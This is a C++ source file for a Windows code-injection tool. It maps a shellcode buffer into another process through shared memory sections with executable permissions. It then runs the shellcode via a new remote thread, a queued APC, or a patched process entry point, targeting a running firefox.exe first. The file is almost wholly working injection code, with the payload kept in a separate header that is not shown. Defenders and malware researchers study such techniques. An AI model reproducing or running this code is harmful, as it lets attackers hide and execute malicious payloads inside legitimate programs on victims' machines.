#include <Windows.h>
#include <iostream>


#include "main.h"
#include "createproc.h"
#include "enumproc.h"

#include "payload.h"

typedef enum {
    ADD_THREAD,
    ADD_APC,
    PATCH_EP
} INJECTION_POINT;

using namespace std;

PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
{
    HANDLE hSection = NULL;
    OBJECT_ATTRIBUTES hAttributes;
    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));

    LARGE_INTEGER maxSize;
    maxSize.HighPart = 0;
    maxSize.LowPart = shellcodeSize;
    NTSTATUS status = NULL;
    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
    {
        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section handle: %x\n", hSection);

    PVOID sectionBaseAddress = NULL;
    SIZE_T viewSize = 0;
    SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE

    // map the section in context of current process:
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section BaseAddress: %p\n", sectionBaseAddress);

    memcpy (sectionBaseAddress, shellcode, shellcodeSize);
    printf("Shellcode copied!\n");

    //map the new section into context of opened process
    PVOID sectionBaseAddress2 = NULL;
    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }

    //unmap from the context of current process
    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
    ZwClose(hSection);

    printf("Section mapped at address: %p\n", sectionBaseAddress2);
    return sectionBaseAddress2;
}

bool inject_in_new_process(INJECTION_POINT mode)
{
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    if (create_new_process2(pi) == false) {
        return false;
    }
    LPVOID remote_shellcode_ptr = NULL;
    switch (mode) {
    case ADD_THREAD:
        remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
        run_shellcode_in_new_thread(pi.hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
        // not neccessery to resume the main thread
        break;
    case ADD_APC:
        remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
        add_shellcode_to_apc(pi.hThread, remote_shellcode_ptr);
        ResumeThread(pi.hThread); //resume the main thread
        break;
    case PATCH_EP:
        paste_shellcode_at_ep(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
        ResumeThread(pi.hThread); //resume the main thread
        break;
    }
    //close handles
    ZwClose(pi.hThread);
    ZwClose(pi.hProcess);
    return true;
}

bool inject_in_existing_process()
{
    HANDLE hProcess = find_running_process(L"firefox.exe");
    LPVOID remote_shellcode_ptr = map_code_into_process(hProcess, g_Shellcode, sizeof(g_Shellcode));
    if (remote_shellcode_ptr == NULL) {
        return false;
    }
    return run_shellcode_in_new_thread2(hProcess, remote_shellcode_ptr);
}

int main()
{
   if (load_ntdll_functions() == FALSE) {
        printf("Failed to load NTDLL function\n");
        return (-1);
    }
    if (load_kernel32_functions() == FALSE) {
        printf("Failed to load KERNEL32 function\n");
        return (-1);
    }

    if (inject_in_existing_process()) {
        printf("[SUCCESS] Code injected in existing process!\n");
    } else {
        if (inject_in_new_process(INJECTION_POINT::PATCH_EP)) {
             printf("[SUCCESS] Code injected in a new process!\n");
        }
    }
    system("pause");
    return 0;
}
